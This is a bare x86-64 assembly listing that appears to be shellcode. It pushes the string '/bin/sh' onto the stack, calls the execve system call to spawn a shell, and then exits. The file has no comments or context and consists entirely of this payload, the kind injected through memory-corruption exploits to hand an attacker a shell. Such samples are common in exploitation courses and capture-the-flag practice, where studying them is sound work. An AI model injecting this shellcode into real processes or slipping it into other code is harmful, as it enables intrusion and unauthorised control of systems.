.section .text
.globl _start
_start:
    mov    $0x3b, %rax
    mov    $0x0,  %rdx
    movabs $0x0068732f6e69622f,%r8                    
    push   %r8
    mov    %rsp,  %rdi
    push   %rdx
    push   %rdi
    mov    %rsp,  %rsi
    syscall
    mov    $0x3c, %rax
    mov    $0x0,  %rdi
    syscall     
